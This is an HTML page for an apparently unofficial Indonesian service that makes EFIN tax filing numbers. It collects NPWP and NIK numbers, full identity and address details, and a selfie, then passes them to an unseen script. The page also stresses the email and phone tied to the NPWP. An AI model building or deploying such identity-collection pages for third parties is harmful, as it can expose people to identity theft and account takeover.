<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Layanan Pembuatan EFIN</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <style>
        @media screen and (max-width: 768px) {
            .container {
                padding: 15px;
                width: 100%;
                max-width: 100%;
            }

            .form-row {
                flex-direction: column;
            }

            .form-group {
                width: 100%;
                margin-bottom: 15px;
            }

            input[type="text"],
            input[type="date"],
            textarea {
                width: 100%;
                padding: 12px;
                font-size: 16px;
                border-radius: 8px;
            }

            .selfie-example img {
                max-width: 100%;
                height: auto;
                border-radius: 8px;
            }

            button[type="submit"] {
                width: 100%;
                padding: 15px;
                font-size: 16px;
                margin-top: 20px;
            }

            label {
                font-size: 14px;
                margin-bottom: 8px;
                display: block;
            }

            small {
                font-size: 12px;
                color: #666;
            }
        }
    </style>
</head>
<body>
    <main>
        <section class="hero">
            <div class="container">
                <h2>Pembuatan EFIN Mudah dan Cepat</h2>
                <p>Kami membantu Anda mendapatkan EFIN (Electronic Filing Identification Number) dengan mudah dan aman</p>
            </div>
        </section>

        <section class="form-section">
            <div class="container">
                <form id="efinForm">
                    <div class="form-row">
                        <div class="form-group">
                            <label for="npwp">NPWP *</label>
                            <input type="text" id="npwp" name="npwp" placeholder="00.000.000.0-000.000" maxlength="15" pattern="[0-9]{15}" required>
                            <small>Masukkan 15 digit angka NPWP tanpa tanda titik dan strip</small>
                        </div>

                        <div class="form-group">
                            <label for="nik">NIK *</label>
                            <input type="text" id="nik" name="nik" placeholder="3201016012800001" maxlength="16" pattern="[0-9]{16}" required>
                            <small>Masukkan 16 digit angka NIK</small>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="nama">Nama Lengkap *</label>
                        <input type="text" id="nama" name="nama" placeholder="Nama sesuai KTP" required>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="tempatLahir">Tempat Lahir *</label>
                            <input type="text" id="tempatLahir" name="tempatLahir" placeholder="Kota kelahiran" required>
                        </div>

                        <div class="form-group">
                            <label for="tglLahir">Tanggal Lahir *</label>
                            <input type="date" id="tglLahir" name="tglLahir" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="alamat">Alamat Sesuai KTP *</label>
                        <textarea id="alamat" name="alamat" placeholder="Alamat lengkap sesuai KTP" required></textarea>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="rt">RT *</label>
                            <input type="text" id="rt" name="rt" placeholder="001" required>
                        </div>

                        <div class="form-group">
                            <label for="rw">RW *</label>
                            <input type="text" id="rw" name="rw" placeholder="002" required>
                        </div>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label for="kelurahan">Kelurahan *</label>
                            <input type="text" id="kelurahan" name="kelurahan" placeholder="Nama kelurahan" required>
                        </div>

                        <div class="form-group">
                            <label for="kecamatan">Kecamatan *</label>
                            <input type="text" id="kecamatan" name="kecamatan" placeholder="Nama kecamatan" required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label for="kota">Kota/Kabupaten *</label>
                        <input type="text" id="kota" name="kota" placeholder="Nama kota/kabupaten" required>
                    </div>

                    <div class="form-group">
                        <label for="selfie">Foto Selfie *</label>
                        <input type="file" id="selfie" name="selfie" accept="image/*" required>
                        <div class="selfie-guide">
                            <div class="selfie-example">
                                <img src="contoh.jpg" alt="Contoh foto selfie yang benar">
                                <p class="selfie-caption" style="color: #000; font-weight: bold; font-size: 16px; margin-top: 10px; text-align: center; background-color: #f0f0f0; padding: 8px; border-radius: 4px;">
                                    Contoh foto selfie yang benar
                                </p>
                            </div>
                        </div>
                    </div>

                    <button type="submit">Kirim Formulir</button>
                </form>
            </div>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2024 Jasa Pembuatan EFIN. All rights reserved.</p>
        </div>
    </footer>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Tampilkan pop-up saat halaman dimuat
            let konfirmasi = confirm("PENTING!\n\nUntuk Membuat EFIN, Wajib ingat gmail dan nomor hp yang terikat di NPWP tersebut.\n\nJika tidak ingat, JANGAN isi formulir ini karena EFIN tidak akan bisa dibuat!");
            
            if (konfirmasi) {
                // Jika user klik OK, tampilkan pesan kedua
                let pesanPengingat = document.createElement('div');
                pesanPengingat.innerHTML = `
                    <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
                                background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.3);
                                max-width: 400px; text-align: center; z-index: 1000;">
                        <h3 style="color: #d9534f; margin-bottom: 15px;">MOHON DIBACA!</h3>
                        <p style="font-size: 16px; line-height: 1.5;">
                            Pastikan Anda mengingat:<br>
                            - Gmail yang terdaftar di NPWP<br>
                            - Nomor HP yang terdaftar di NPWP<br><br>
                            <span style="color: #d9534f; font-weight: bold;">PERHATIAN:</span><br>
                            Jika Anda tidak mengingat data di atas,<br>
                            mohon JANGAN melanjutkan pengisian formulir<br>
                            karena EFIN tidak akan bisa dibuat!
                        </p>
                        <div id="timer" style="font-weight: bold; margin: 10px 0;"></div>
                    </div>
                `;
                document.body.appendChild(pesanPengingat);

                // Timer 10 detik
                let waktuTersisa = 10;
                let timer = setInterval(() => {
                    document.getElementById('timer').textContent = `Pesan ini akan hilang dalam ${waktuTersisa} detik`;
                    waktuTersisa--;
                    if (waktuTersisa < 0) {
                        clearInterval(timer);
                        document.body.removeChild(pesanPengingat);
                    }
                }, 1000);
            } else {
                // Jika user klik Cancel, redirect ke halaman lain atau tutup tab
                window.location.href = "https://www.pajak.go.id";
            }
        });
    </script>
    <script src="script.js"></script>
</body>
